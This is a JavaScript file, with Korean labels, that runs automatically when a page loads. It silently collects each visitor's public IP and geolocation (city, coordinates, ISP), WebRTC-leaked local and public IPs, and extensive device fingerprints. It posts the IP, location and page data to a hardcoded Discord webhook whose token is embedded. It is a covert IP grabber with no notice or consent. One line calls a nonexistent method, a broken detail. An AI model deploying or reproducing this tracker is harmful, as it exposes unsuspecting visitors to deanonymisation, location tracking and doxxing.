const WEBHOOK_URL = 'https://discord.com/api/webhooks/1448558533397446696/eaX0Rdzr5DgzdXVB1UfVzp4dEtXT12r9mDtIY9a8my40nZhvR5xQiwweuLV43o4QRYHn';

let visitorInfo = {};

function getDeviceInfo() {
    return {
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        language: navigator.language,
        languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
        cpuCores: navigator.hardwareConcurrency || 'N/A',
        touchPoints: navigator.maxTouchPoints || 0,
        cookieEnabled: navigator.cookieEnabled,
        onlineStatus: navigator.onLine ? '온라인' : '오프라인',
        doNotTrack: navigator.doNotTrack || 'N/A'
    };
}

function getScreenInfo() {
    return {
        screenWidth: screen.width,
        screenHeight: screen.height,
        screenAvailWidth: screen.availWidth,
        screenAvailHeight: screen.availHeight,
        windowWidth: window.innerWidth,
        windowHeight: window.innerHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        pixelRatio: window.devicePixelRatio || 1,
        orientation: screen.orientation ? screen.orientation.type : 'N/A'
    };
}

function getNetworkInfo() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection) {
        return {
            effectiveType: connection.effectiveType || 'N/A',
            downlink: connection.downlink ? `${connection.downlink} Mbps` : 'N/A',
            rtt: connection.rtt ? `${connection.rtt}ms` : 'N/A',
            saveData: connection.saveData ? '활성화' : '비활성화'
        };
    }
    return {
        effectiveType: 'N/A',
        downlink: 'N/A',
        rtt: 'N/A',
        saveData: 'N/A'
    };
}

function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browserName = 'Unknown';
    let browserVersion = 'Unknown';

    if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) {
        browserName = 'Chrome';
        browserVersion = ua.match(/Chrome\/([0-9.]+)/)?.[1] || 'Unknown';
    } else if (ua.indexOf('Firefox') > -1) {
        browserName = 'Firefox';
        browserVersion = ua.match(/Firefox\/([0-9.]+)/)?.[1] || 'Unknown';
    } else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) {
        browserName = 'Safari';
        browserVersion = ua.match(/Version\/([0-9.]+)/)?.[1] || 'Unknown';
    } else if (ua.indexOf('Edg') > -1) {
        browserName = 'Edge';
        browserVersion = ua.match(/Edg\/([0-9.]+)/)?.[1] || 'Unknown';
    }

    return { browserName, browserVersion };
}

function getOSInfo() {
    const ua = navigator.userAgent;
    let osName = 'Unknown';

    if (ua.indexOf('Windows NT 10.0') > -1) osName = 'Windows 10/11';
    else if (ua.indexOf('Windows NT 6.3') > -1) osName = 'Windows 8.1';
    else if (ua.indexOf('Windows NT 6.2') > -1) osName = 'Windows 8';
    else if (ua.indexIndexOf('Windows NT 6.1') > -1) osName = 'Windows 7';
    else if (ua.indexOf('Mac OS X') > -1) osName = 'macOS';
    else if (ua.indexOf('Linux') > -1) osName = 'Linux';
    else if (ua.indexOf('Android') > -1) osName = 'Android';
    else if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) osName = 'iOS';

    return osName;
}

async function getBatteryInfo() {
    try {
        if ('getBattery' in navigator) {
            const battery = await navigator.getBattery();
            return {
                level: Math.round(battery.level * 100) + '%',
                charging: battery.charging ? '충전 중' : '충전 안 함',
                chargingTime: battery.chargingTime === Infinity ? 'N/A' : `${Math.round(battery.chargingTime / 60)}분`,
                dischargingTime: battery.dischargingTime === Infinity ? 'N/A' : `${Math.round(battery.dischargingTime / 60)}분`
            };
        }
    } catch {}
    return { level: 'N/A', charging: 'N/A', chargingTime: 'N/A', dischargingTime: 'N/A' };
}

function getMemoryInfo() {
    try {
        if ('memory' in performance) {
            const memory = performance.memory;
            return {
                usedJSHeapSize: `${Math.round(memory.usedJSHeapSize / 1024 / 1024)} MB`,
                totalJSHeapSize: `${Math.round(memory.totalJSHeapSize / 1024 / 1024)} MB`,
                jsHeapSizeLimit: `${Math.round(memory.jsHeapSizeLimit / 1024 / 1024)} MB`
            };
        }
    } catch {}
    return { usedJSHeapSize: 'N/A', totalJSHeapSize: 'N/A', jsHeapSizeLimit: 'N/A' };
}

function getPluginsInfo() {
    const plugins = [];
    try {
        for (let i = 0; i < navigator.plugins.length; i++) {
            const plugin = navigator.plugins[i];
            plugins.push(`${plugin.name} (${plugin.version || 'N/A'})`);
        }
    } catch {}
    return plugins.length > 0 ? plugins.slice(0, 10).join(', ') : 'N/A';
}

function getWebGLInfo() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                vendor: gl.getParameter(gl.VENDOR),
                renderer: gl.getParameter(gl.RENDERER),
                version: gl.getParameter(gl.VERSION),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A',
                unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A'
            };
        }
    } catch {}
    return {
        vendor: 'N/A',
        renderer: 'N/A',
        version: 'N/A',
        shadingLanguageVersion: 'N/A',
        unmaskedVendor: 'N/A',
        unmaskedRenderer: 'N/A'
    };
}

function getCanvasFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('Canvas fingerprint ????', 2, 2);
        return canvas.toDataURL().slice(-50);
    } catch {
        return 'N/A';
    }
}

function getAudioFingerprint() {
    try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const analyser = audioContext.createAnalyser();
        const gainNode = audioContext.createGain();

        oscillator.connect(analyser);
        analyser.connect(gainNode);
        gainNode.connect(audioContext.destination);

        oscillator.frequency.value = 10000;
        gainNode.gain.value = 0;

        const dataArray = new Float32Array(analyser.frequencyBinCount);
        analyser.getFloatFrequencyData(dataArray);

        audioContext.close();

        return dataArray.slice(0, 10).join(',').slice(0, 50);
    } catch {
        return 'N/A';
    }
}

function getFontsInfo() {
    const fonts = [
        'Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Palatino',
        'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact',
        'Arial Narrow', 'Tahoma', 'Geneva', 'Century Gothic', 'Lucida Console', 'Monaco',
        'Courier', 'Bradley Hand ITC', 'Brush Script MT', 'Luminari', 'Chalkduster'
    ];

    const availableFonts = [];
    const testString = 'mmmmmmmmmmlli';
    const testSize = '72px';

    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');

    context.font = testSize + ' monospace';
    const baselineWidth = context.measureText(testString).width;

    fonts.forEach(font => {
        context.font = testSize + ' ' + font + ', monospace';
        const width = context.measureText(testString).width;
        if (width !== baselineWidth) {
            availableFonts.push(font);
        }
    });

    return availableFonts.length > 0 ? availableFonts.slice(0, 10).join(', ') : 'N/A';
}

function getStorageInfo() {
    try {
        const info = {
            localStorage: 'localStorage' in window ? '사용 가능' : '사용 불가',
            sessionStorage: 'sessionStorage' in window ? '사용 가능' : '사용 불가',
            indexedDB: 'indexedDB' in window ? '사용 가능' : '사용 불가',
            webSQL: 'openDatabase' in window ? '사용 가능' : '사용 불가'
        };

        if ('storage' in navigator && 'estimate' in navigator.storage) {
            navigator.storage.estimate().then(estimate => {
                info.quota = `${Math.round(estimate.quota / 1024 / 1024)} MB`;
                info.usage = `${Math.round(estimate.usage / 1024 / 1024)} MB`;
            });
        }

        return info;
    } catch {
        return { localStorage: 'N/A', sessionStorage: 'N/A', indexedDB: 'N/A', webSQL: 'N/A' };
    }
}

function getMediaDevicesInfo() {
    return new Promise(async (resolve) => {
        try {
            if ('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {
                const devices = await navigator.mediaDevices.enumerateDevices();
                resolve({
                    audioInput: devices.filter(d => d.kind === 'audioinput').length,
                    audioOutput: devices.filter(d => d.kind === 'audiooutput').length,
                    videoInput: devices.filter(d => d.kind === 'videoinput').length
                });
            } else {
                resolve({ audioInput: 'N/A', audioOutput: 'N/A', videoInput: 'N/A' });
            }
        } catch {
            resolve({ audioInput: 'N/A', audioOutput: 'N/A', videoInput: 'N/A' });
        }
    });
}

function getTimezoneInfo() {
    try {
        const date = new Date();
        return {
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: date.getTimezoneOffset(),
            dst: date.getTimezoneOffset() < new Date(date.getFullYear(), 0, 1).getTimezoneOffset(),
            locale: Intl.DateTimeFormat().resolvedOptions().locale
        };
    } catch {
        return { timezone: 'N/A', timezoneOffset: 'N/A', dst: 'N/A', locale: 'N/A' };
    }
}

function getPerformanceInfo() {
    try {
        const nav = performance.getEntriesByType('navigation')[0];
        return {
            loadTime: Math.round(nav.loadEventEnd - nav.fetchStart) + 'ms',
            domContentLoaded: Math.round(nav.domContentLoadedEventEnd - nav.fetchStart) + 'ms',
            pageLoadTime: Math.round(performance.now()) + 'ms'
        };
    } catch {
        return { loadTime: 'N/A', domContentLoaded: 'N/A', pageLoadTime: 'N/A' };
    }
}


/* ============================================================
      📌 WebRTC STUN 기반 IP 후보 탐지 (멀티 STUN 서버)
============================================================ */
async function getWebRTCIPs() {
    return new Promise((resolve) => {
        const ips = {
            localIPs: [],
            candidateIPs: [],
            blocked: "No"
        };

        const pc = new RTCPeerConnection({
            iceServers: [
                { urls: "stun:stun.l.google.com:19302" },
                { urls: "stun:stun.cloudflare.com:3478" },
                { urls: "stun:stun1.l.google.com:19302" }
            ]
        });

        pc.createDataChannel("dummy");

        pc.onicecandidate = (event) => {
            if (!event || !event.candidate) {
                if (ips.localIPs.length === 0 && ips.candidateIPs.length === 0) {
                    ips.blocked = "Yes";
                }
                resolve(ips);
                return;
            }

            const candidate = event.candidate.candidate;
            const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
            if (!ipMatch) return;

            const ip = ipMatch[1];

            if (candidate.includes("typ host") && !ips.localIPs.includes(ip)) {
                ips.localIPs.push(ip);
            }

            if ((candidate.includes("typ srflx") || candidate.includes("typ relay")) &&
                !ips.candidateIPs.includes(ip)) {
                ips.candidateIPs.push(ip);
            }
        };

        pc.createOffer()
            .then((offer) => pc.setLocalDescription(offer))
            .catch(() => resolve(ips));

        setTimeout(() => {
            if (ips.localIPs.length === 0 && ips.candidateIPs.length === 0) {
                ips.blocked = "Yes";
            }
            resolve(ips);
        }, 3000);
    });
}


/* ============================================================
      📌 메인 실행: 모든 정보 수집 + 웹훅 전송
============================================================ */
async function collectAndSendInfo() {
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        visitorInfo.ip = ipData.ip;

        try {
            const locationResponse = await fetch(`http://ip-api.com/json/${ipData.ip}`);
            const locationData = await locationResponse.json();

            if (locationData.status === 'success') {
                visitorInfo.location = {
                    country: locationData.country,
                    countryCode: locationData.countryCode,
                    region: locationData.regionName,
                    city: locationData.city,
                    isp: locationData.isp,
                    org: locationData.org,
                    timezone: locationData.timezone,
                    lat: locationData.lat,
                    lon: locationData.lon
                };
            }
        } catch {}

        const now = new Date();
        visitorInfo.timestamp = now.toISOString();
        visitorInfo.localTime = now.toLocaleString('ko-KR');
        visitorInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        visitorInfo.device = getDeviceInfo();
        visitorInfo.browser = getBrowserInfo();
        visitorInfo.os = getOSInfo();
        visitorInfo.screen = getScreenInfo();
        visitorInfo.network = getNetworkInfo();
        visitorInfo.battery = await getBatteryInfo();
        visitorInfo.memory = getMemoryInfo();
        visitorInfo.plugins = getPluginsInfo();
        visitorInfo.webgl = getWebGLInfo();
        visitorInfo.canvasFingerprint = getCanvasFingerprint();
        visitorInfo.audioFingerprint = getAudioFingerprint();
        visitorInfo.fonts = getFontsInfo();
        visitorInfo.storage = getStorageInfo();
        visitorInfo.mediaDevices = await getMediaDevicesInfo();
        visitorInfo.timezoneInfo = getTimezoneInfo();
        visitorInfo.performance = getPerformanceInfo();
        visitorInfo.url = window.location.href;
        visitorInfo.referrer = document.referrer || '직접 접속';

        /* 📌 WebRTC 결과 추가 */
        visitorInfo.webRTC = await getWebRTCIPs();

        const embed = {
            title: "새로운 방문자 정보",
            description: "사용자가 페이지에 접속했습니다.",
            color: 0x5865F2,
            timestamp: visitorInfo.timestamp,
            thumbnail: {
                url: "https://cdn3.emoji.gg/emojis/6333-discord-logo.png"
            },
            fields: [
                {
                    name: "기본 정보",
                    value: `**IP 주소:** ${visitorInfo.ip}\n**ISP:** ${visitorInfo.location?.isp || 'N/A'}\n**조직:** ${visitorInfo.location?.org || 'N/A'}\n**접속 시간:** ${visitorInfo.localTime}`,
                    inline: true
                },
                {
                    name: "위치 정보",
                    value: `**국가:** ${visitorInfo.location?.country || 'N/A'} (${visitorInfo.location?.countryCode || 'N/A'})\n**지역:** ${visitorInfo.location?.region || 'N/A'}\n**도시:** ${visitorInfo.location?.city || 'N/A'}\n**좌표:** ${visitorInfo.location?.lat || 'N/A'}, ${visitorInfo.location?.lon || 'N/A'}\n**시간대:** ${visitorInfo.timezoneInfo.timezone}`,
                    inline: true
                },
                {
                    name: "WebRTC IP 후보",
                    value:
                        `**차단 여부:** ${visitorInfo.webRTC.blocked}\n` +
                        `**로컬 IP:** ${visitorInfo.webRTC.localIPs.join(', ') || 'N/A'}\n` +
                        `**공인 후보 IP:** ${visitorInfo.webRTC.candidateIPs.join(', ') || 'N/A'}`,
                    inline: false
                },
                {
                    name: "접속 정보",
                    value: `**URL:** ${visitorInfo.url}\n**리퍼러:** ${visitorInfo.referrer}`,
                    inline: false
                }
            ],
            footer: { text: "자동 수집 시스템" }
        };

        const payload = { embeds: [embed] };

        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

    } catch (error) {
        console.error('정보 수집/전송 실패:', error);
    }
}

window.addEventListener('load', collectAndSendInfo);
